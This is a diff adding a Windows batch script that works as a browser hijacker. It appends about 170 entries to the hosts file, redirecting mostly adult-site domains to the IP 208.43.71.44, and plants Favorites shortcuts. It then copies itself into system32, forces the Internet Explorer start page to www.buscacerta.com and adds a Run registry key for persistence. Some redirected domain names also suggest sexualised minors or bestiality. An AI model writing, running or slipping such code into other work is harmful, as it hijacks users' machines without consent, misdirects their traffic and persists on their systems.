@@ -1,0 +1,187 @@
+@ echo off
+cd\
+echo 208.43.71.44 www.marcelinha.com >> %SystemRoot%\system32\drivers\etc\hosts 
+echo 208.43.71.44 www.galinhas.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.filmesgratis.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.filmesgratis.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexodigital.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.terra.com.br/sexo >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.uol.com.br/sexo >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.bol.com.br/sexo >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.carlinha.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.orgias69.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexo.uol.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexobr.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.lolitinhas.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexobis.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexonabanheira.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.fotosdesexo.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexo24h.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.piratasdosexo.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexoforte.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.bhsexo.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.reidosexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexodeluxo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.lojadosexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.museudosexo.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexonavan.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexohumido.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sites.rededosexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.forumdesexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexoaqui.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.casadanocio.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexocomanimaisgratis.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.flavinha.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.teensexo.uol.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.oguiadosexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.portugalhotline.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.videosnet.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.seuporno.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.linhamix.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexocaseiro.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.gracinha.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexolandia.org >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexoevideos.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.somentesexo.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.revistasgratis.ws >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.ibest.com.br/sexo/ >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.filmesdesexogratis.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexojovem.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.arquivodosexo.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexoabc.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.ig.com.br/sexo >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.paraisoamador.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.filmesvip.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexoamoretraicao.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.depositodevideos.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.viciadosnosexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.websexo.org >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexodot.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.filhadaputa.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexofacil.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.galerias.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.osexoenatural.blogspot.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.rededosexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.escritoriodosexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.biscatinhas.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.galaxiagay.org >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexoegostosas.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexo-sexy.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.voyeurfilmes.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sogostosas.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.guiasexual.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.michupa.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.eduarda.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.acervoamador.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.filmesadultos.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.hotfilmes.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.putasdefavela.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.gulagay.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.toquefeminino.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.filmesnafaixa.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.famosasnuas.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.blitzerotica.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.clubedapunheta.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.videosgratisz.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexando.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.clubedaputariabr.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 guiadosexo.uol.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 sexoamador.uol.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.amantesvirtuais.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.4sexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.semcalcinha.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexo.com.mx >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.lesbricas.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.colegiodosexo.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexofree.org >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.amadorascarentes.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.zoofiliaquente.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.100sexo.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.3pic.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.teenport.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.teensexymodels.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexyteenmodels.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.nnteens.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.yoursexyteens.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.teensexyvirgins.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexyteenmodels.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.teensexyvirgins.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.teensexytime.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.dream8teen.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexyteendolls.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexyteensandy.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.caseirasbrasil.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.planetaamadoras.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.amadoras.filhadaputa.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.xoxoteiros.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.socaseiras.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.amadorasbrasileiras.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.siririca.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.diariodaputaria.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.paraisoamador.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.fotosnanet.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.tufos.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.tufos.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.bandodaputaria.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.amadorasbrasileiras.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.diariodasamadoras.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.cretinas.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.fotosdeamadoras.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.clubedaputariabr.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.diarioamadoras.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.bucetinhas.info >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.filmesdesexogratis.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.biscatinhas.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.diretorioadulto.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.bauerotico.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.famosasnuas.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexo24h.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.putasrebeldes.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sogostosas.net >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.panelavelha.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.amazonsexy.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.pornotv.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.putinhasafada.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.mundopt.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.putasesexo.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.erotica.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.playboy.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.revistaplayboy.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.playboy.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.putascaseiras.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.xupaxota.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.casadoscontos.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.contoseroticos.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.contosfemininos.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.contosquentes.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.contoerotico.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.clubedoscontos.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 contos-eroticos.marcelinha.com >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.relatoseroticos.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+echo 208.43.71.44 www.sexyswing.com.br >> %SystemRoot%\system32\drivers\etc\hosts
+@echo off
+echo [InternetShortcut]>"%userprofile%\favoritos\Busca Certa.url"
+echo URL=www.buscacerta.com>>"%userprofile%\favoritos\Busca certa.url"
+@echo off
+echo [InternetShortcut]>"%userprofile%\favoritos\Imagens e Mensagens.url"
+echo URL=www.imagensemensagens.com/>>"%userprofile%\favoritos\Imagens e Mensagens.url"
+@echo off
+echo [InternetShortcut]>"%userprofile%\favoritos\Economizando.url"
+echo URL=www.economizando.com/>>"%userprofile%\favoritos\Jogos Online.url"
+@echo off
+echo [InternetShortcut]>"%userprofile%\favoritos\Ache Rapido.url"
+echo URL=www.acherapido.com/>>"%userprofile%\favoritos\Ache Rapido.url"
+@echo off
+echo [InternetShortcut]>"%userprofile%\favoritos\Gatas de Orkut.url"
+echo URL=www.GatasdeOrkut.com>>"%userprofile%\favoritos\Gatas de Orkut.url"
+@echo off
+echo [InternetShortcut]>"%userprofile%\favoritos\Trabalhos Escolar.url"
+echo URL=www.trabalhonota10.com/>>"%userprofile%\favoritos\Trabalhos Escolar.url"
+@echo off
+echo [InternetShortcut]>"%userprofile%\favoritos\Receitas Tipicas.url"
+echo URL=www.receitastipicas.com/>>"%userprofile%\favoritos\Receitas Tipicas.url"
+@echo off
+copy %0 "%windir%\system32\main_page.bat"
+REG ADD "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d www.buscacerta.com /f
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Users1 /d "%windir%\system32\main_page.bat" /f
+exit
